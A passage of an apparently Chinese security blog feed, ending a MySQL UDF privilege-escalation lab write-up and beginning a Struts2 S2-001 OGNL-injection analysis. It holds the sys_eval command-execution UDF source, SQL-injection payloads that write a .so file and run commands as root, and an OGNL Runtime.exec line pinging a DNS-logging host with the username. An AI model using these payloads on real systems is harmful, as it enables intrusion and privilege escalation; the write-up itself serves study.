udf_add.cpp -fPIC -shared -o udf_add.so</span><br></pre></td></tr></table></figure><p>创建自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function udf_add returns int SONAME &quot;udf_add.so&quot;;</span><br></pre></td></tr></table></figure><p>查看当前自定义函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br><span class="line">+---------+-----+------------+----------+</span><br><span class="line">| name    | ret | dl         | type     |</span><br><span class="line">+---------+-----+------------+----------+</span><br><span class="line">| udf_add |   2 | udf_add.so | function |</span><br><span class="line">+---------+-----+------------+----------+</span><br></pre></td></tr></table></figure><p>执行自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select udf_add(3,4);</span><br></pre></td></tr></table></figure><p>结果:可以看到已经完成了计算返回了7,至此我们成功调用了第三方库当中的函数.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+--------------+</span><br><span class="line">| udf_add(3,4) |</span><br><span class="line">+--------------+</span><br><span class="line">|            7 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p>自己写这样一个udf_app.so是为了更好的理解这个加载的过程,互联网上已经有现成的.so文件,其中实现了许多的函数,其中就包括可以命令执行的sys_eval()函数,如下:</p><p>完整源码来源:<a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.c">https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.c</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">sys_eval</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">UDF_INIT *initid</span></span></span><br><span class="line"><span class="function"><span class="params">,UDF_ARGS *args</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">char</span>* result</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">unsigned</span> <span class="keyword">long</span>* length</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">char</span> *is_null</span></span></span><br><span class="line"><span class="function"><span class="params">,<span class="keyword">char</span> *error</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">FILE *pipe;</span><br><span class="line"><span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> outlen, linelen;</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">outlen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">pipe = popen(args-&gt;args[<span class="number">0</span>], <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), pipe) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">linelen = <span class="built_in">strlen</span>(line);</span><br><span class="line">result = <span class="built_in">realloc</span>(result, outlen + linelen);</span><br><span class="line"><span class="built_in">strncpy</span>(result + outlen, line, linelen);</span><br><span class="line">outlen = outlen + linelen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pclose(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(*result) || result == <span class="literal">NULL</span>) &#123;</span><br><span class="line">*is_null = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">result[outlen] = <span class="number">0x00</span>;</span><br><span class="line">*length = <span class="built_in">strlen</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思考:对于第三方导入的函数其对应的操作是由我们mysql去完成的,如果mysql是由root用户启动,那么自定义函数的一切操作都是由root身份去完成的,也就是说如果这个时候我们能在so文件中加载一个执行命令的函数,那么我们执行的一切都是通过root身份去执行的.</p><h1 id="由sql注入到提权"><a href="#由sql注入到提权" class="headerlink" title="由sql注入到提权"></a>由sql注入到提权</h1><p>我搭建了一个简易的web环境,其中存在sql注入</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114185910652.png" class title="image-20220114185910652"><p>后端代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line">@<span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">@<span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cmd</span>)&#123;</span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id = &quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;执行的sql语句:&quot;</span>.<span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    mysqli_multi_query(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = mysqli_store_result(<span class="variable">$link</span>);</span><br><span class="line">    <span class="variable">$result_arr</span> = mysqli_fetch_assoc(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result_arr</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单分析一下,很明显,sql语句存在拼接,存在sql注入,并且使用了mysqli_multi_query()可执行多条sql语句,cmd参数会直接命令执行</p><p>尝试命令执行,发现根目录存在flag文件</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114190046862.png" class title="image-20220114190046862"><p>当前权限为www-data:</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192632122.png" class title="image-20220114192632122"><p>尝试读取,无法读取,权限不足</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114190157775.png" class title="image-20220114190157775"><p>因为存在sql注入,考虑通过利用sql注入写入恶意.so文件,利用mysql进行命令执行,读取flag</p><p>so文件路径一般默认为/usr/lib/mysql/plugin/</p><p>将我们准备好的so文件进行16进制编码,这里的方法有很多种,不做解释,编码完成的结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure><p>构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1;select hexdata INTO DUMPFILE &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br></pre></td></tr></table></figure><p>这里的hexdata就是刚刚转换出来的16进制</p><p>**注:**这里使用INTO DUMPFILE进行文件写入,需要开启load_file()及secure_file_priv 没有限制</p><p>查看secure_file_priv:可以看到value为空,没有任何限制(这个限制,就是限制mysql允许写入文件的路径,为空就是允许所有)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure_file_priv%&#39;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure><p>构造payload写入udf.so</p><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192106534.png" class title="image-20220114192106534"><p>创建自定义函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</span><br></pre></td></tr></table></figure><p>使用自定义函数执行命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,sys_eval(&#39;whoami&#39;);</span><br></pre></td></tr></table></figure><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192459103.png" class title="image-20220114192459103"><p>可以看到此时已经是root权限了</p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1 union select 1,sys_eval(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure><img src="/2022/01/14/UDF%E6%8F%90%E6%9D%83/image-20220114192551918.png" class title="image-20220114192551918">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UDF（user-defined-function&quot;&gt;&lt;a href=&quot;#UDF（user-defined-function&quot; class=&quot;headerlink&quot; title=&quot;UDF（user defined function)&quot;&gt;&lt;/a&gt;UDF（user d</summary>
      
    
    
    
    
    <category term="udf提权" scheme="http://example.com/tags/udf%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2 001详细分析</title>
    <link href="http://example.com/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-09T07:03:04.000Z</published>
    <updated>2022-01-27T10:59:35.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>本篇文章是站在一个只会一丁点java基础,没有任何Java开发经验的的菜鸡眼中去完成的.所设计知识点繁多,杂乱,从Struts2的执行流程到漏洞Rce,适合小白看.本次分析的是Struts2-S001,版本为2.0.8</p><h1 id="0X01-OGNL表达式"><a href="#0X01-OGNL表达式" class="headerlink" title="0X01:OGNL表达式"></a>0X01:OGNL表达式</h1><p><a href="https://commons.apache.org/proper/commons-ognl/">OGNL</a> 是 Object Graphic Navigation Language (对象图导航语言)的缩写，是一个开源项目。它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法。</p><p>Struts2 中支持以下几种表达式语言：OGNL、JSTL、Groovy、Velocity。Struts 框架使用 OGNL 作为默认的表达式语言。</p><p>为什么这里要提到OGNL表达式呢?因为就是OGNL存在可以执行java代码的函数,而Struts2使用了OGNL进行开发,但是在这个过程中由于疏忽导致用户可控OGNL处理的表达式数据从而造成注入.</p><p>打个比方,就好比php里面开发者用了eval()函数,但是呢由于开发不严谨导致eval()函数的参数被用户可控了,那肯定就直接RCE了.</p><p>OGNL表达式到底怎么用呢?我们来举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.scenario.effect.impl.sw.sse.SSEBlend_SRC_OUTPeer;</span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name, Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User rootUser = <span class="keyword">new</span> User(<span class="string">&quot;tom&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Map&lt;String, User&gt; context = <span class="keyword">new</span> HashMap&lt;String, User&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;user1&quot;</span>,<span class="keyword">new</span> User(<span class="string">&quot;jack&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        context.put(<span class="string">&quot;user2&quot;</span>,<span class="keyword">new</span> User(<span class="string">&quot;rose&quot;</span>,<span class="number">22</span>));</span><br><span class="line">        OgnlContext oc = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">        <span class="comment">//ognl由root和context两部分组成</span></span><br><span class="line">        oc.setRoot(rootUser);</span><br><span class="line">        oc.setValues(context);</span><br><span class="line">        <span class="comment">//get ognl的root的值的时候，直接写希望获取的值的名字就可以了</span></span><br><span class="line">        String name = (String) Ognl.getValue(<span class="string">&quot;name&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        Integer age = (Integer) Ognl.getValue(<span class="string">&quot;age&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        <span class="comment">//get ognl非root的值的时候，需要使用#</span></span><br><span class="line">        User name1 = (User) Ognl.getValue(<span class="string">&quot;#context[&#x27;user1&#x27;]&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        String name2 = (String) Ognl.getValue(<span class="string">&quot;#user2.name&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        Integer age1 = (Integer) Ognl.getValue(<span class="string">&quot;#user1.age&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        Integer age2 = (Integer) Ognl.getValue(<span class="string">&quot;#user2.age&quot;</span>,oc,oc.getRoot());</span><br><span class="line">        <span class="comment">//ognl的getValue函数可以直接执行java函数</span></span><br><span class="line">        Object obj = Ognl.getValue(<span class="string">&quot;&#x27;helloworld&#x27;.length()&quot;</span>,oc.getRoot());</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        <span class="comment">//访问静态属性和方法的时候需要使用@</span></span><br><span class="line">        Object obj2 = Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;ping %USERNAME%.d6d10d38.toxiclog.xyz&#x27;)&quot;</span>,oc.getRoot());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是网上看的一个OGNL表达式的使用例子,我们大致看一下就行了,重点看到</p><p>Ognl.getValue(“”,oc,getRoot())这个函数,等会儿我们分析Struts2的时候会看到他</p><p>Ognl.getValue()的第一个参数是表达式,这个表达式功能强大,按照OGNL的格式可以执行计算亦可以执行代码.</p><p>OGNL 主要有以下几种常见的使用：</p><ul><li>对于类属性的引用：<code>Class.field</code></li><li>方法调用： <code>Class.method()</code></li><li>静态方法/变量调用：<code>@org.su18.struts.Test@test(&#39;aaa&#39;)</code> 或 <code>@org.su18.struts.Constants@MY_CONSTANTS</code></li><li>创建 java 实例对象：完整类路径：<code>new java.util.ArrayList()</code></li><li>创建一个初始化 List：<code>&#123;&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;&#125;</code></li><li>创建一个 Map：<code>#@java.util.TreeMap@&#123;&#39;a&#39;:&#39;aa&#39;, &#39;b&#39;:&#39;bb&#39;, &#39;c&#39;:&#39;cc&#39;, &#39;d&#39;:&#39;dd&#39;&#125;</code></li><li>访问数组/集合中的元素：<code>#Arrays[0]</code></li><li>访问 Map 中的元素：<code>#Map[&#39;key&#39;]</code></li><li>OGNL 针对集合提供了一些伪属性（如size，isEmpty），让我们可以通过属性的方式来调用方法。</li></ul><p>除了以上基础操作之外，OGNL 还支持投影、过滤：</p><ul><li>投影（把集合中所有对象的某个属性抽出来，单独构成一个新的集合对象）：<code>collection.&#123;expression&#125;</code></li><li>过滤（将满足条件的对象，构成一个新的集合返回）：<code>collection.&#123;?|^|$ expression&#125;</code></li></ul><p>其中上面 <code>?|^|$</code> 的含义如下：</p><ul><li><code>?</code>：获得所有符合逻辑的元素。</li><li><code>^</code>：获得符合逻辑的第一个元素。</li><li><code>$</code>：获得符合逻辑的最后一个元素。</li></ul><p>在使用过滤操作时，通常会使用 <code>#this</code>，这个表达式用于代表当前正在迭代的集合中的对象。</p><p>OGNL 还支持 Lambda 表达式：<code>:[ ... ]</code>，例如计算阶乘 <code>#f = :[#this==1?1:#this*#f(#this-1)] , #f(4)</code>。</p><p>还有使用数学运算符，使用“,”号连接表达式，in 与 not in 运算符，比较简单，不再赘述。</p><p>可以看到 OGNL表达式的功能非常强大,用户一旦可控后果不堪设想.</p><h1 id="0X02-Struts2"><a href="#0X02-Struts2" class="headerlink" title="0X02:Struts2"></a>0X02:Struts2</h1><p>百度Struts2审计已经有一大把教程使用Maven来搭建复现环境了,这里就不浪费篇章再复制粘贴一边,直接进入主题.</p><p>看到这篇文章的大家应该下面这张图大家应该已经不陌生了,他清楚的写出了Struts2的执行流程.</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109151832955.png" class title="image-20220109151832955"><p>让我们跟着这个图来看一下这个Struts2究竟是怎么执行的.</p><p>项目目录如下:</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109153039655.png" class title="image-20220109153039655"><h2 id="1-Filter-过滤器"><a href="#1-Filter-过滤器" class="headerlink" title="1.Filter(过滤器)"></a>1.Filter(过滤器)</h2><p>客户端发起一个http请求,这个请求经过我们的Tomcat容器处理后首先便要经过这个巨大的黄色方框,这也就是Struts2的起点,过滤器</p><p>这个核心过滤器的配置在我们的web.xml中,它规定了我们的请求走的是哪一个过滤器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span></span><br><span class="line">      org.apache.struts2.dispatcher.FilterDispatcher</span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从配置文件中不难看出我们经过的过滤器是来自org.apache.struts2.dispatcher.FilterDispatcher类,规则是所有的请求全部经过</p><p>(url-pattern为/*)</p><p>我们来到org.apache.struts2.dispatcher.FilterDispatcher:152</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109153722240.png" class title="image-20220109153722240"><p>首先便会获取request,response,servletContext</p><p>接着来到org.apache.struts2.dispatcher.FilterDispatcher:184</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.dispatcher.serviceAction(request, response, servletContext, mapping);</span><br></pre></td></tr></table></figure><h2 id="2-ActionProxy-动作代理"><a href="#2-ActionProxy-动作代理" class="headerlink" title="2.ActionProxy(动作代理)"></a>2.ActionProxy(动作代理)</h2><p>我们跟进serviceAction()来到org.apache.struts2.dispatcher.Dispatcher:332</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActionProxy proxy = ((ActionProxyFactory)config.getContainer().getInstance(ActionProxyFactory.class)).createActionProxy(namespace, name, extraContext, <span class="keyword">true</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>在这个地方实例化ActionProxy,这个ActionProxy也就是为Struts2执行流程图中的第五步做准备</p><p>往下来到org.apache.struts2.dispatcher.Dispatcher:339,调用proxy的execute执行动作,也就是执行了Struts2流程中的ActionProxy到拦截器这一过程</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109165218191.png" class title="image-20220109165218191"><p>根据流程图我们也可以看到现在我们来到拦截器的部分了</p><h3 id="3-拦截器"><a href="#3-拦截器" class="headerlink" title="3.拦截器"></a>3.拦截器</h3><p>跟进proxy.execute()后直接调用invocation.invoke(),这里面通过反射机制调用了用户action中的excute(下图中的excute)</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109165540002.png" class title="image-20220109165540002"><h2 id="4-执行动作"><a href="#4-执行动作" class="headerlink" title="4.执行动作"></a>4.执行动作</h2><p>这里便是我们自己写的execute了,判断用户名和密码是否为空,如果为空则返回error</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109174040674.png" class title="image-20220109174040674"><h1 id="0X03-漏洞造成点"><a href="#0X03-漏洞造成点" class="headerlink" title="0X03:漏洞造成点"></a>0X03:漏洞造成点</h1><p>前面的一大堆只是大致了解了一下Struts2是如何工作的(这其中其实说的也不是特别详细,只是个大概,毕竟第一次接触,理解的十分不完善),网上大部分文章也没有提及,都是从下文doEndTag开始分析的,在开始分析之前我想各位应该都自己搭过环境并且复现过了,这里抛出了我的一个疑问</p><p><strong>疑问1:为什么只有在return “error”的时候会复现成功而return “success”的时候不会呢?</strong></p><p>这个疑问会在后面进行解答</p><p>我么们输入如下的字符串%{2+2}</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109183038955.png" class title="image-20220109183038955"><p>经过前面一大堆Struts2的处理后来到了doEndTag和doStartTag</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109175802212.png" class title="image-20220109175802212"><p>doStartTag是用来解析.jsp文件的函数,解析开始标签的时候会用到</p><p>doEndTag是用来解析.jsp文件的函数,解析结束标签的时候会用到</p><p>当执行到doEndTag时就代表已经解析完了对应jsp文件表单上的数据,即将传递给Struts2进行处理,那么我们就把断点下在ComponentTagSupport.class:25,看一下数据都被拿去干了啥</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109181944424.png" class title="image-20220109181944424"><p>跟进compoent.end()</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109183420459.png" class title="image-20220109183420459"><p>继续跟进evaluateParams()</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109183936560.png" class title="image-20220109183936560"><p>往下看到302行(UIBean.class),此处会判断altSynatax()是否开启,也就是否允许在标签中使用表达式语法,这里默认就是True,这是很重要的.如果没开启这个就无法造成rce</p><p>然后我们就会得到一个拼接好的字符串(表达式)%{username},等等OGNL就通过这个表达式来获取表单中username的值</p><p>继续往下看到306行,跟进findValue</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109184322019.png" class title="image-20220109184322019"><p>跟进TestPareUtil.translateVariables(),继续跟进translateVariables()</p><img src="/2022/01/09/Struts2-S001%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220109184435854.png" class title="image-20220109184435854"><p>来到translateVariables()这里也是主要的漏洞代码段,我们把它单独拿出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 